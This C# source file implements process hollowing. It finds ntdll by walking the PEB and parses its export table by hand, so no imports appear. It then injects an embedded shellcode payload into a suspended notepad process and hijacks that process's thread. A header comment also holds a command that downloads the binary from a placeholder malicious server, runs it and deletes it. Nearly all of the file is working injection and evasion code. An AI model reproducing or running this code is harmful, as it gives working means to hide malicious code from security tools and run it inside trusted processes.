// The "Invisible" Resolver: PEB-Walking & Export Parsing (C#)
// cmd.exe /c "curl -s #{server.malicious.url}/PebHollower.exe -o %TEMP%\PebHollower.exe && %TEMP%\PebHollower.exe && del %TEMP%\PebHollower.exe"
// In this implementation, the binary doesn't "ask" Windows where ntdll.dll is. Instead, it looks inside its own internal process structures, finds the list of loaded modules, identifies the base address of ntdll, and then manually parses the raw bytes of that DLL's Export Table to find the function addresses.


/* 
How It Works:
PEB Discovery: The code uses a very minimal P/Invoke (NtQueryInformationProcess) to find the Process Environment Block (PEB). This is the OS's "internal book" for the process.

LDR Data Walking: Inside the PEB, it accesses the Ldr structure. This contains a linked list of every DLL currently loaded. The code walks this list, comparing names until it finds ntdll.dll.

Export Table Parsing: Once it has the memory address of ntdll.dll, it stops using APIs. It treats the DLL as a raw byte array. It follows the PE (Portable Executable) format:
  - It finds the Export Directory.
  - It loops through the list of function names (AddressOfNames).
  - When it matches "NtWriteVirtualMemory", it grabs the corresponding ordinal and uses it to find the actual Function RVA (Relative Virtual Address).

Invisible Linking: The final result is a binary that can call any Windows function without ever "importing" it.
*/
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Text;

namespace PebHollowing
{
    class Program
    {
        // --- 🟢 FULL EMBEDDED PAYLOAD (x64 Calc PoC) 🟢 ---
        private static byte[] payload = new byte[] {
            0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0,
            0x48, 0x8d, 0x15, 0x07, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x05, 0x00, 0x00, 0x00, 0xff, 0x25,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x8d, 0x05, 0x01, 0x00, 0x00, 0x00, 0xc3, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
        };

        // --- Delegates ---
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtAllocateVirtualMemory(IntPtr hProc, ref IntPtr baseAddr, IntPtr zeroBits, ref UIntPtr regionSize, uint allocType, uint protect);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtWriteVirtualMemory(IntPtr hProc, IntPtr baseAddr, byte[] buffer, uint size, out IntPtr written);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtGetContextThread(IntPtr hThread, ref CONTEXT64 ctx);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtSetContextThread(IntPtr hThread, ref CONTEXT64 ctx);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtResumeThread(IntPtr hThread, out uint count);

        // --- Structures ---
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64 {
            public ulong P1, P2, P3, P4, P5, P6; public uint ContextFlags; public uint MxCsr; public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs; public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7, Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15, Rip;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)] public byte[] Flt;
            public ulong L1, L2, L3, L4, V0, V1, V2, V3, V4, V5, V6, V7, V8, V9, V10, V11, V12, V13, V14, V15, V16, V17, V18, V19, V20, V21, V22, V23, V24, V25, V26, V27, V28, V29, V30, V31, VC, DC, B1, B2, E1, E2;
        }

        [DllImport("kernel32.dll")] public static extern bool CreateProcess(string app, string cmd, IntPtr pA, IntPtr tA, bool inh, uint flags, IntPtr env, string dir, [In] ref STARTUPINFO si, out PROCESS_INFORMATION pi);
        [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public uint cb; public string res, desk, title; public uint x, y, xs, ys, xc, yc, fill, flags; public ushort show, res2; public IntPtr res2p, hIn, hOut, hErr; }
        [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public uint dwProcessId, dwThreadId; }

        [DllImport("ntdll.dll")] public static extern uint NtQueryInformationProcess(IntPtr hProc, int pic, ref PROCESS_BASIC_INFORMATION pbi, uint len, out uint retLen);
        [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr ExitStatus; public IntPtr PebBaseAddress; public IntPtr AffinityMask; public IntPtr BasePriority; public IntPtr UniqueProcessId; public IntPtr InheritedFromUniqueProcessId; }

        static void Main(string[] args)
        {
            Console.WriteLine("[*] Initializing PEB-Walking Resolver...");

            // 1. Get PEB Address via NtQueryInformationProcess (one of the few hooks we can't easily avoid in C#)
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            uint retLen;
            NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 0, ref pbi, (uint)Marshal.SizeOf(pbi), out retLen);
            IntPtr pebAddr = pbi.PebBaseAddress;

            // 2. Walk PEB to find ntdll.dll Base Address
            // PEB -> Ldr (0x18 on x64) -> InLoadOrderModuleList (0x10)
            IntPtr ldr = Marshal.ReadIntPtr(pebAddr, 0x18);
            IntPtr moduleList = Marshal.ReadIntPtr(ldr, 0x10); // InLoadOrderModuleList
            
            IntPtr ntdllBase = IntPtr.Zero;
            IntPtr currentModule = moduleList;

            while (currentModule != IntPtr.Zero)
            {
                IntPtr dllBase = Marshal.ReadIntPtr(currentModule, 0x30);
                IntPtr dllNamePtr = Marshal.ReadIntPtr(currentModule, 0x60);
                string dllName = Marshal.PtrToStringUni(dllNamePtr);

                if (dllName != null && dllName.ToLower().Contains("ntdll.dll"))
                {
                    ntdllBase = dllBase;
                    break;
                }
                currentModule = Marshal.ReadIntPtr(currentModule); // Next module
                if (currentModule == moduleList) break; 
            }

            Console.WriteLine("[+] Found ntdll.dll Base: 0x" + ntdllBase.ToString("X"));

            // 3. Manually parse Export Table of ntdll.dll to find function addresses
            var ntUnmap = (NtUnmapViewOfSection)GetExport(ntdllBase, "NtUnmapViewOfSection", typeof(NtUnmapViewOfSection));
            var ntAlloc = (NtAllocateVirtualMemory)GetExport(ntdllBase, "NtAllocateVirtualMemory", typeof(NtAllocateVirtualMemory));
            var ntWrite = (NtWriteVirtualMemory)GetExport(ntdllBase, "NtWriteVirtualMemory", typeof(NtWriteVirtualMemory));
            var ntGetCtx = (NtGetContextThread)GetExport(ntdllBase, "NtGetContextThread", typeof(NtGetContextThread));
            var ntSetCtx = (NtSetContextThread)GetExport(ntdllBase, "NtSetContextThread", typeof(NtSetContextThread));
            var ntResume = (NtResumeThread)GetExport(ntdllBase, "NtResumeThread", typeof(NtResumeThread));

            // 4. Perform Hollowing Routine
            STARTUPINFO si = new STARTUPINFO(); si.cb = (uint)Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            CreateProcess("C:\\Windows\\System32\\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            IntPtr baseAddr = (IntPtr)0x400000;
            ntUnmap(pi.hProcess, baseAddr);

            UIntPtr size = (UIntPtr)payload.Length;
            ntAlloc(pi.hProcess, ref baseAddr, IntPtr.Zero, ref size, 0x3000, 0x40);
            ntWrite(pi.hProcess, baseAddr, payload, (uint)payload.Length, out _);

            CONTEXT64 ctx = new CONTEXT64();
            ctx.ContextFlags = 0x100001; 
            ntGetCtx(pi.hThread, ref ctx);
            ctx.Rip = (ulong)baseAddr;
            ntSetCtx(pi.hThread, ref ctx);

            uint count;
            ntResume(pi.hThread, out count);
            Console.WriteLine("[+] Hollowing Success. All functions resolved via manual PEB/Export walking.");
        }

        static Delegate GetExport(IntPtr moduleBase, string exportName, Type delegateType)
        {
            // Parse PE Headers
            int e_lfanew = Marshal.ReadInt32(moduleBase, 0x3C);
            IntPtr ntHeader = moduleBase + e_lfanew;
            IntPtr dataDirectory = ntHeader + 0x88; // Export Directory RVA location for x64
            int exportRva = Marshal.ReadInt32(dataDirectory);
            IntPtr exportDirectory = moduleBase + exportRva;

            int numberOfNames = Marshal.ReadInt32(exportDirectory, 0x18);
            int functionsRva = Marshal.ReadInt32(exportDirectory, 0x1C);
            int namesRva = Marshal.ReadInt32(exportDirectory, 0x20);
            int ordinalsRva = Marshal.ReadInt32(exportDirectory, 0x24);

            for (int i = 0; i < numberOfNames; i++)
            {
                int nameRva = Marshal.ReadInt32(moduleBase + namesRva + i * 4);
                string currentName = Marshal.PtrToStringAnsi(moduleBase + nameRva);

                if (currentName == exportName)
                {
                    short ordinal = Marshal.ReadInt16(moduleBase + ordinalsRva + i * 2);
                    int functionRva = Marshal.ReadInt32(moduleBase + functionsRva + ordinal * 4);
                    IntPtr functionAddr = moduleBase + functionRva;
                    return Marshal.GetDelegateForFunctionPointer(functionAddr, delegateType);
                }
            }
            return null;
        }
    }
}
